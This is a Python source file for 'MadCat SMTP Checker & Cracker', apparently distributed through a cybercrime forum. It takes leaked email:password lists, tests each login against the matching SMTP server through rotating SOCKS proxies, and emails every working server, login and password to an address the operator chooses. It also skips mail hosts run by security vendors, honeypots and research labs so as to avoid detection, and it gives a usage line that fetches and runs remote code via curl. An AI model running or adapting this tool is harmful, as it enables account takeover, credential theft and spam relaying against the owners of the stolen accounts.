#!/usr/local/bin/python3

import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64, socks
from requests.exceptions import RequestException
try:
	import psutil, requests, dns.resolver
except ImportError:
	print('\033[1;33minstalling missing packages...\033[0m')
	os.system('apt -y install python3-pip; pip3 install psutil requests dnspython pyopenssl')
	import psutil, requests, dns.resolver

if not sys.version_info[0] > 2 and not sys.version_info[1] > 8:
	exit('\033[0;31mpython 3.9 is required. try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')

sys.stdout.reconfigure(encoding='utf-8')
# mail providers, where SMTP access is desabled by default
bad_mail_servers = 'gmail,googlemail,google,mail.ru,yahoo,qq.com'
# additional dns servers
custom_dns_nameservers = '1.0.0.1,1.1.1.1,8.8.4.4,8.8.8.8,8.20.247.20,8.26.56.26,9.9.9.9,9.9.9.10,64.6.64.6,74.82.42.42,77.88.8.1,77.88.8.8,84.200.69.80,84.200.70.40,149.112.112.9,149.112.112.11,149.112.112.13,149.112.112.112,195.46.39.39,204.194.232.200,208.67.220.220,208.67.222.222'.split(',')
# expanded lists of SMTP endpoints, where we can knock
autoconfig_data_url = 'https://raw.githubusercontent.com/aels/mailtools/main/smtp-checker/autoconfigs_enriched.txt'
# dangerous mx domains, skipping them all
dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mx37\.m..p\.com|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'

b   = '\033[1m'
z   = '\033[0m'
wl  = '\033[2K'
up  = '\033[F'
err = b+'[\033[31mx\033[37m] '+z
okk = b+'[\033[32m+\033[37m] '+z
wrn = b+'[\033[33m!\033[37m] '+z
inf = b+'[\033[34mi\033[37m] '+z
npt = b+'[\033[37m?\033[37m] '+z

def show_banner():
	banner = f"""

              ,▄   .╓███?                ,, .╓███)                              
            ╓███| ╓█████╟               ╓█/,███╙                  ▄▌            
           ▄█^[██╓█* ██F   ,,,        ,╓██ ███`     ,▌          ╓█▀             
          ╓█` |███7 ▐██!  █▀╙██b   ▄██╟██ ▐██      ▄█   ▄███) ,╟█▀▀`            
          █╟  `██/  ██]  ██ ,██   ██▀╓██  ╙██.   ,██` ,██.╓█▌ ╟█▌               
         |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
         ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
         ╙█                           ╙                                         
          ╙     {b}MadCat SMTP Checker & Cracker v23.03.30{z}
                Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                https://github.com/aels/mailtools
                https://t.me/freebug
	"""
	for line in banner.splitlines():
		print(line)
		time.sleep(0.05)

def red(s,type=0):
	return f'\033[{str(type)};31m'+str(s)+z

def green(s,type=0):
	return f'\033[{str(type)};32m'+str(s)+z

def orange(s,type=0):
	return f'\033[{str(type)};33m'+str(s)+z

def blue(s,type=0):
	return f'\033[{str(type)};34m'+str(s)+z

def violet(s,type=0):
	return f'\033[{str(type)};35m'+str(s)+z

def cyan(s,type=0):
	return f'\033[{str(type)};36m'+str(s)+z

def white(s,type=0):
	return f'\033[{str(type)};37m'+str(s)+z

def bold(s):
	return b+str(s)+z

def num(s):
	return f'{int(s):,}'

def tune_network():
	if os.name != 'nt':
		try:
			import resource
			resource.setrlimit(8, (2**20, 2**20))
			print(okk+'tuning rlimit_nofile:          '+', '.join([bold(num(i)) for i in resource.getrlimit(8)]))
			# if os.geteuid() == 0:
			# 	print('tuning network settings...')
			# 	os.system("echo 'net.core.rmem_default=65536\nnet.core.wmem_default=65536\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\nnet.ipv4.tcp_max_orphans=4096\nnet.ipv4.tcp_slow_start_after_idle=0\nnet.ipv4.tcp_synack_retries=3\nnet.ipv4.tcp_syn_retries =3\nnet.ipv4.tcp_window_scaling=1\nnet.ipv4.tcp_timestamp=1\nnet.ipv4.tcp_sack=0\nnet.ipv4.tcp_reordering=3\nnet.ipv4.tcp_fastopen=1\ntcp_max_syn_backlog=1500\ntcp_keepalive_probes=5\ntcp_keepalive_time=500\nnet.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1\nnet.ipv4.ip_local_port_range=32768 65535\ntcp_fin_timeout=60' >> /etc/sysctl.conf")
			# else:
			# 	print('Better to run this script as root to allow better network performance')
		except Exception as e:
			print(wrn+'failed to set rlimit_nofile:   '+str(e))

def check_ipv4():
	print(inf+'checking ipv4 address in blacklists...'+up)
	try:
		socket.has_ipv4 = read('https://api.ipify.org')
		socket.ipv4_blacklist = re.findall(r'"name":"([^"]+)","listed":true', read('https://addon.dnslytics.net/ipv4info/v1/'+socket.has_ipv4))
		socket.ipv4_blacklist = red(', '.join(socket.ipv4_blacklist)) if socket.ipv4_blacklist else False
	except:
		socket.has_ipv4 = False
		socket.ipv4_blacklist = False

def check_ipv6():
	try:
		socket.has_ipv6 = read('https://api6.ipify.org', timeout=5)
	except:
		socket.has_ipv6 = False

def debug(msg):
	global debuglevel, results_que
	debuglevel and results_que.put(msg)

def load_smtp_configs():
	global autoconfig_data_url, domain_configs_cache
	try:
		configs = requests_get(autoconfig_data_url, timeout=15).text.splitlines()
		for line in configs:
			line = line.strip().split(';')
			if len(line) != 3:
				continue
			domain_configs_cache[line[0]] = (line[1].split(','), line[2])
	except Exception as e:
		print(err+'failed to load SMTP configs. '+str(e))
		print(err+'performance will be affected.')

def first(a):
	return (a or [''])[0]

def bytes_to_mbit(b):
	return round(b/1024./1024.*8, 2)

def base64_encode(string):
	return base64.b64encode(str(string).encode('ascii')).decode('ascii')

def normalize_delimiters(s):
	return re.sub(r'[;,\t|]', ':', re.sub(r'[\'" ]+', '', s))

def read(path):
	return os.path.isfile(path) and open(path, 'r', encoding='utf-8-sig', errors='ignore').read() or re.search(r'^https?://', path) and requests_get(path, timeout=15).text or ''

def read_lines(path):
	return read(path).splitlines()

def is_listening(ip, port):
    # Randomly select a proxy from the list
    proxy = random.choice(proxy_list)
    proxy_host, proxy_port = proxy.split(':')

    try:
        port = int(port)
        # Configure the socket to use the SOCKS5 proxy
        socks.setdefaultproxy(socks.SOCKS5, proxy_host, int(proxy_port))
        socket.socket = socks.socksocket

        # Determine if we need an IPv6 socket
        socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
        s = socket.socket(socket_type, socket.SOCK_STREAM)
        s.settimeout(10)

        # Wrap the socket with SSL if connecting to port 465
        if port == 465:
            s = ssl.create_default_context().wrap_socket(s, server_hostname=ip)

        # Attempt to connect to the specified IP and port
        s.connect((ip, port))
        s.close()
        return True
    except Exception as e:
        print(f"Failed to connect to {ip}:{port} through {proxy_host}:{proxy_port} - {str(e)}")
        return False
    finally:
        # Reset the socket modification to not use the proxy
        socks.setdefaultproxy()  # Clear proxy settings
        socket.socket = socket._socket.socket  # Reset to original socket class
class SocksProxyContext:
    def __init__(self, proxy_list):
        self.original_socket = socket.socket
        self.proxy_list = proxy_list

    def __enter__(self):
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            proxy_host, proxy_port = proxy.split(':')
            socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
            socket.socket = socks.socksocket
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        socket.socket = self.original_socket
        socks.set_default_proxy()  # Reset proxy settings

def get_rand_ip_of_host(host):
	global proxy_list
	resolver_obj = dns.resolver.Resolver()
	try:
		with SocksProxyContext(proxy_list):
			try:
				answer = resolver_obj.resolve(host, 'CNAME')
				host = str(answer[0].target)
			except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
				pass  # If no CNAME is found, continue with the original host

			record_type = 'AAAA' if socket.has_ipv6 else 'A'
			ip_addresses = resolver_obj.resolve(host, record_type)
			chosen_ip = str(random.choice(ip_addresses))
			print(f'get ip: {chosen_ip}')
			return chosen_ip
	except Exception as e:
		raise Exception(f'No A record found for {host}: {str(e)}')

def get_alive_neighbor(ip, port):
	if ':' in str(ip):
		return ip
	else:
		tail = int(ip.split('.')[-1])
		prev_neighbor_ip = re.sub(r'\.\d+$', '.'+str(tail - 1 if tail>0 else 2), ip)
		next_neighbor_ip = re.sub(r'\.\d+$', '.'+str(tail + 1 if tail<255 else 253), ip)
		if is_listening(prev_neighbor_ip, port):
			return prev_neighbor_ip
		if is_listening(next_neighbor_ip, port):
			return next_neighbor_ip
		raise Exception('No listening neighbors found for '+ip+':'+str(port))

def guess_smtp_server(domain):
	global default_login_template, resolver_obj, domain_configs_cache, dangerous_domains
	domains_arr = [domain, 'smtp.'+domain, 'mail.'+domain]
	for host in domains_arr:
		try:
			ip = get_rand_ip_of_host(host)
		except:
			continue
		for port in [587, 465]:
			debug(f'trying {host}, {ip}:{port}')
			if is_listening(ip, port):
					return ([host+':'+str(port)], default_login_template)
	raise Exception('no connection details found for '+domain)

def get_smtp_config(domain):
	global domain_configs_cache, default_login_template
	domain = domain.lower()
	if not domain in domain_configs_cache:
		domain_configs_cache[domain] = ['', default_login_template]
		domain_configs_cache[domain] = guess_smtp_server(domain)
	return domain_configs_cache[domain]

def quit(signum, frame):
	print('\r\n'+okk+'exiting... see ya later. bye.')
	sys.exit(0)

def is_valid_email(email):
	return re.match(r'^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$', email)

def find_email_password_collumnes(list_filename):
	email_collumn = False
	with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
		for line in fp:
			line = normalize_delimiters(line.lower())
			email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
			if email:
				email_collumn = line.split(email[0])[0].count(':')
				password_collumn = email_collumn+1
				if re.search(r'@[\w.-]+\.[a-z]{2,}:.+123', line):
					password_collumn = line.count(':') - re.split(r'@[\w.-]+\.[a-z]{2,}:.+123', line)[-1].count(':')
					break
	if email_collumn is not False:
		return (email_collumn, password_collumn)
	raise Exception('the file you provided does not contain emails')

def wc_count(filename, lines=0):
	file_handle = open(filename, 'rb')
	while buf:=file_handle.raw.read(1024*1024):
		lines += buf.count(b'\n')
	return lines+1

def is_ignored_host(mail):
	global exclude_mail_hosts
	return len([ignored_str for ignored_str in exclude_mail_hosts.split(',') if ignored_str in mail.split('@')[-1]])>0

def set_random_proxy():
    if proxy_list:
        proxy = random.choice(proxy_list)
        proxy_host, proxy_port = proxy.split(':')
        socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
        socket.socket = socks.socksocket
    else:
        raise ValueError("Proxy list is empty")


def socket_send_and_read(sock, cmd=''):
	try:
		sock.settimeout(15)
		if cmd:
			sock.sendall(cmd.encode() + b'\r\n')
		response = sock.recv(4096).decode()
		return response
	except Exception as e:
		print(f"Error during send/read: {str(e)}")
		return ""

def socket_get_free_smtp_server(smtp_server, port):
    port = int(port)
    smtp_server_ip = get_rand_ip_of_host(smtp_server)

    # Select a random proxy from the global list
    proxy = random.choice(proxy_list) if proxy_list else None
    if proxy:
        proxy_host, proxy_port = proxy.split(':')
        socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
        sock_proxy = socks.socksocket()  # Create a new SOCKS proxy socket
    else:
        socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
        sock_proxy = socket.socket(socket_type, socket.SOCK_STREAM)

    sock_proxy.settimeout(10)

    # SSL context creation for secure connections
    if port == 465:
        context = ssl.create_default_context()
        s = context.wrap_socket(sock_proxy, server_hostname=smtp_server)
    else:
        s = sock_proxy

    try:
        s.connect((smtp_server_ip, port))
    except Exception as e:
        print(f"Connection error with {smtp_server_ip}:{port} -> {e}")
        s.close()
        raise
    return s

def socket_try_tls(sock, self_host):
    set_random_proxy()  # Set a random proxy before the connection
    answer = socket_send_and_read(sock, f'EHLO {self_host}')
    if 'starttls' in answer.lower():
        answer = socket_send_and_read(sock, 'STARTTLS')
        if answer.startswith('220'):
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=self_host)
    return sock

def socket_try_login(sock, self_host, smtp_login, smtp_password):
    set_random_proxy()  # Set a random proxy before attempting login
    answer = socket_send_and_read(sock, f'EHLO {self_host}')
    if 'auth' in answer.lower():
        credentials = f"{smtp_login}\0{smtp_login}\0{smtp_password}"
        answer = socket_send_and_read(sock, f'AUTH PLAIN {base64.b64encode(credentials.encode()).decode()}')
        if '235' in answer:
            return sock
    raise Exception(f"Login failed: {answer}")


def socket_try_mail(sock, smtp_from, smtp_to, data):
    set_random_proxy()  # Ensure the socket is using a random proxy
    try:
        answer = socket_send_and_read(sock, f'MAIL FROM: <{smtp_from}>')
        if answer.startswith('250'):
            answer = socket_send_and_read(sock, f'RCPT TO: <{smtp_to}>')
            if answer.startswith('250'):
                answer = socket_send_and_read(sock, 'DATA')
                if answer.startswith('354'):
                    answer = socket_send_and_read(sock, data + '\r\n.')  # Ensure to end data with '\r\n.'
                    if answer.startswith('250'):
                        socket_send_and_read(sock, 'QUIT')
                        return True
        raise Exception("SMTP command failed: " + answer)
    finally:
        sock.close()

def load_proxies():
    global proxy_list
    choice = input('Load proxy from file or net: (1/2) ')
    if choice == '1':
        try:
            with open('2.txt', 'r') as file:
                proxy_list = [line.strip() for line in file if line.strip()]
                print('Proxies loaded:', len(proxy_list))
        except FileNotFoundError:
            print('Proxy file not found.')
            sys.exit(1)
    else:
        try:
            response = requests.get('https://arachnet.cloud/socks?type=list', timeout=10)
            response.raise_for_status()  # Raises a HTTPError for bad responses
            proxy_list = [line.strip() for line in response.text.split('\n') if line.strip()]
            print('Proxies loaded from web:', len(proxy_list))
        except requests.RequestException as e:
            print(f"Failed to load proxies from the web: {str(e)}")
            sys.exit(1)

def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
	global verify_email
	if is_valid_email(smtp_user):
		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
	else:
		smtp_login = smtp_user
	s = socket_get_free_smtp_server(smtp_server, port)
	answer = socket_send_and_read(s)
	if answer[:3] == '220':
		s = socket_try_tls(s, smtp_server) if port != '465' else s
		s = socket_try_login(s, smtp_server, smtp_login, password)
		if not verify_email:
			s.close()
			return True
		headers_arr = [
			'From: MadCat checker <%s>'%smtp_user,
			'Resent-From: admin@localhost',
			'To: '+verify_email,
			'Subject: new SMTP from MadCat checker',
			'Return-Path: '+smtp_user,
			'Reply-To: '+smtp_user,
			'X-Priority: 1',
			'X-MSmail-Priority: High',
			'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
			'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
			'MIME-Version: 1.0',
			'Content-Type: text/html; charset="utf-8"',
			'Content-Transfer-Encoding: 8bit'
		]
		body = f'{smtp_server}|{port}|{smtp_login}|{password}'
		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
	s.close()
	raise Exception(answer)

def clean_smtp_entries(filename):
	try:
		# Читаем строки из файла
		with open(filename, 'r') as file:
			lines = file.readlines()

		# Словарь для хранения строк по доменам
		domain_dict = {}
		
		# Разбор строк для определения доменов и их строк
		for line in lines:
			# Извлекаем домен из строки (предполагается, что домен - это второй элемент в строке после разделения по точке)
			parts = line.split('.')
			if len(parts) > 1:
				domain = parts[1].strip()  # предполагается, что домен указан после первой точки
				if domain not in domain_dict:
					domain_dict[domain] = {'lines': [], 'has_smtp': False}
				domain_dict[domain]['lines'].append(line)
				if line.startswith("smtp."):
					domain_dict[domain]['has_smtp'] = True

		# Записываем обработанные строки в новый файл
		output_filename = "cleaned_" + filename
		with open(output_filename, 'w') as file:
			for domain in domain_dict:
				if domain_dict[domain]['has_smtp']:
					# Записываем только строки, начинающиеся на "smtp."
					for line in domain_dict[domain]['lines']:
						if line.startswith("smtp."):
							file.write(line)
				else:
					# Если нет smtp строки, сохраняем все строки этого домена
					file.writelines(domain_dict[domain]['lines'])
	except Exception as e:
		print("Error! Can't delete dublicates")
		return []

def get_proxy():
    global current_proxy, request_count
    if request_count % 5 == 0:
        current_proxy = random.choice(proxy_list)
    request_count += 1
    return {
        'http': f'socks5://{current_proxy}',
        'https': f'socks5://{current_proxy}'
    }

def requests_get(url, **kwargs):
    # Use global proxy list to determine the proxy for the request
    proxy = random.choice(proxy_list) if proxy_list else None
    proxies = {
        'http': f'socks5://{proxy}',
        'https': f'socks5://{proxy}'
    } if proxy else {}
    try:
        response = requests.get(url, proxies=proxies, **kwargs)
        return response
    except requests.RequestException as e:
        print(f"Failed to make a request to {url} using {proxies}: {str(e)}")
        return None
	
	
def worker_item(jobs_que, results_que, proxies):
    global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
    while True:
        if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
            break
        if jobs_que.empty():
            if no_jobs_left:
                clean_smtp_entries(smtp_filename)
                break
            else:
                results_que.put('queue exhausted, ' + bold('sleeping...'))
                time.sleep(1)
                continue
        else:
            time_start = time.perf_counter()
            smtp_server, port = 0, 0
            smtp_user, password = jobs_que.get()
            login_template = default_login_template
            try:
                results_que.put(f'getting settings for {smtp_user}:{password}')
                if not smtp_server or not port:
                    smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
                    if len(smtp_server_port_arr):
                        smtp_server, port = random.choice(smtp_server_port_arr).split(':')
                    else:
                        raise Exception('still no connection details for ' + smtp_user)
                results_que.put(blue('connecting to') + f' {smtp_server}|{port}|{smtp_user}|{password}')
                smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
                results_que.put(green(smtp_user + ':\a' + password, 7) + (verify_email and green(' sent to ' + verify_email, 7)))
                open(smtp_filename, 'a').write(f'{smtp_server},{port},{smtp_user},{password}\n')
                goods += 1
            except Exception as e:
                results_que.put(orange((smtp_server and port and smtp_server + ':' + port + ' - ' or '') + ', '.join(str(e).splitlines()).strip()))
            time.sleep(0.04)  # unlock other threads a bit
            loop_times.append(time.perf_counter() - time_start)
            loop_times.pop(0) if len(loop_times) > min_threads else 0
    threads_counter -= 1


def every_second():
	global proxy_list, progress, speed, mem_usage, cpu_usage, net_usage, jobs_que, results_que, threads_counter, min_threads, loop_times, loop_time, no_jobs_left
	progress_old = progress
	
	net_usage_old = 0
	time.sleep(1)
	while True:
		try:
			speed.append(progress - progress_old)
			speed.pop(0) if len(speed)>10 else 0
			progress_old = progress
			mem_usage = round(psutil.virtual_memory()[2])
			cpu_usage = round(sum(psutil.cpu_percent(percpu=True))/os.cpu_count())
			net_usage = psutil.net_io_counters().bytes_sent - net_usage_old
			net_usage_old += net_usage
			loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
			if threads_counter<max_threads and mem_usage<80 and cpu_usage<80 and jobs_que.qsize():
				threading.Thread(target=worker_item, args=(jobs_que, results_que, proxy_list), daemon=True).start()
				threads_counter += 1
		except:
			pass
		time.sleep(0.1)

def printer(jobs_que, results_que):
	global progress, total_lines, speed, loop_time, cpu_usage, mem_usage, net_usage, threads_counter, goods, ignored
	while True:
		status_bar = (
			f'{b}['+green('\u2665',int(time.time()*2)%2)+f'{b}]{z}'+
			f'[ progress: {bold(num(progress))}/{bold(num(total_lines))} ({bold(round(progress/total_lines*100))}%) ]'+
			f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'+
			f'[ cpu: {bold(cpu_usage)}% ]'+
			f'[ mem: {bold(mem_usage)}% ]'+
			f'[ net: {bold(bytes_to_mbit(net_usage*10))}Mbit/s ]'+
			f'[ threads: {bold(threads_counter)} ]'+
			f'[ goods/ignored: {green(num(goods),1)}/{bold(num(ignored))} ]'
		)
		thread_statuses = []
		while not results_que.empty():
			thread_statuses.append(' '+results_que.get())
			progress += 1 if 'getting' in thread_statuses[-1] else 0
		print(wl+'\n'.join(thread_statuses+[status_bar+up]))
		time.sleep(0.04)

signal.signal(signal.SIGINT, quit)
show_banner()
tune_network()
check_ipv4()
check_ipv6()
try:
	help_message = f'usage: \n{npt}python3 <(curl -slkSL bit.ly/madcatsmtp) '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug]'
	list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+['']).pop(0)
	verify_email = ([i for i in sys.argv if is_valid_email(i)]+['']).pop(0)
	exclude_mail_hosts = ','.join([i for i in sys.argv if re.match(r'[\w.,-]+$', i) and not os.path.isfile(i) and not re.match(r'(\d+|debug)$', i)]+[bad_mail_servers])
	start_from_line = int(([i for i in sys.argv if re.match(r'\d+$', i)]+[0]).pop(0))
	debuglevel = len([i for i in sys.argv if i == 'debug'])
	rage_mode = len([i for i in sys.argv if i == 'rage'])
	if not list_filename:
		print(inf+help_message)
		while not os.path.isfile(list_filename):
			list_filename = input(npt+'path to file with emails & passwords: ')
		while not is_valid_email(verify_email) and verify_email != '':
			verify_email = input(npt+'email to send results to (leave empty if none): ')
		exclude_mail_hosts = input(npt+'ignored email domains, comma separated (leave empty if none): ')
		exclude_mail_hosts = bad_mail_servers+','+exclude_mail_hosts if exclude_mail_hosts else bad_mail_servers
		start_from_line = input(npt+'start from line (leave empty to start from 0): ')
		while not re.match(r'\d+$', start_from_line) and start_from_line != '':
			start_from_line = input(npt+'start from line (leave empty to start from 0): ')
		start_from_line = int('0'+start_from_line)
	smtp_filename = re.sub(r'\.([^.]+)$', r'_smtp.\1', list_filename)
	verify_email = verify_email or ''
except Exception as e:
	exit(err+red(e))
try:
	email_collumn, password_collumn = find_email_password_collumnes(list_filename)
except Exception as e:
	exit(err+red(e))


jobs_que = queue.Queue()
results_que = queue.Queue()
ignored = 0
goods = 0
mem_usage = 0
cpu_usage = 0
net_usage = 0
min_threads = int(input("Enter min. threads: "))
max_threads = debuglevel or rage_mode and 600 or 100
threads_counter = 0
no_jobs_left = False
loop_times = []
loop_time = 0
speed = []
progress = start_from_line
default_login_template = '%EMAILADDRESS%'
total_lines = wc_count(list_filename)
resolver_obj = dns.resolver.Resolver()
resolver_obj.nameservers = custom_dns_nameservers
resolver_obj.rotate = True
current_proxy = None
request_count = 0
proxy_list = []
domain_configs_cache = {}

load_proxies()
print(inf+'loading SMTP configs...'+up)
load_smtp_configs()
print(wl+okk+'loaded SMTP configs:           '+bold(num(len(domain_configs_cache))+' lines'))
print(inf+'source file:                   '+bold(list_filename))
print(inf+'total lines to procceed:       '+bold(num(total_lines)))
print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(password_collumn))
print(inf+'ignored email hosts:           '+bold(exclude_mail_hosts))
print(inf+'goods file:                    '+bold(smtp_filename))
print(inf+'verification email:            '+bold(verify_email or '-'))
print(inf+'ipv4 address:                  '+bold(socket.has_ipv4 or '-')+' ('+(socket.ipv4_blacklist or green('clean'))+')')
print(inf+'ipv6 address:                  '+bold(socket.has_ipv6 or '-'))
input(npt+'press '+bold('[ Enter ]')+' to start...')

threading.Thread(target=every_second, daemon=True).start()
threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()

with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
        for _ in range(start_from_line):
            next(fp)
        while True:
            if not no_jobs_left and jobs_que.qsize() < min_threads * 2:
                line = fp.readline()
                if not line:
                    no_jobs_left = True
                    break
                fields = line.strip().split(':')
                if len(fields) == 2 and is_valid_email(fields[0]) and not is_ignored_host(fields[0]) and len(fields[1]) > 5:
                    jobs_que.put((fields[0], fields[1]))
            if threads_counter == 0 and no_jobs_left and jobs_que.qsize() == 0:
                break
            time.sleep(0.04)
time.sleep(1)
print('\r\n'+okk+green('well done. bye.',1))
